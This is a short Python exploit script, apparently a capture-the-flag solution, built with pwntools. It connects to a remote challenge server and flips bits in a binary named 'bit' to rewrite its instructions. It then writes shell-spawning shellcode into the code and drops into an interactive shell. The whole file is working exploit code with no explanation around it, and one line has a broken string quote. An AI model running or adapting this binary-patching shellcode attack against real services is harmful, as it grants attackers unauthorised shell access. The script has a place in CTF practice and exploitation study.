from pwn import *
from binascii import *
import sys, time

context.binary = "./bit"
binary = ELF("./bit")

#p = process(["./bit"])
p = remote("flatearth.fluxfingers.net, "1744")
#context.log_level = "debug"

def edit(binary, start, dest):
    for byte in dest:
        chk = True
        init = binary.data[start - 0x400000]        # binary base
        init = ord(init)
        log.info("{} need xor value {} to make {}".format(init, init ^ ord(byte), ord(byte)))
        for bit in xrange(0, 8):
            if init & (1 << bit) != ord(byte) & (1 << bit):
                log.info("find {} : {} to {}".format(hex(start), bit, ord(byte)))
                p.sendline(hex(start) + ":" + str(bit))

        start += 1

edit(binary, 0x40072b, "\x15")
edit(binary, 0x0000000000400570, asm(shellcraft.sh()))
edit(binary, 0x000000000040072C, "\xe8\x3f\xfe\xff\xff")
p.sendline("0x400720:0")

p.interactive()
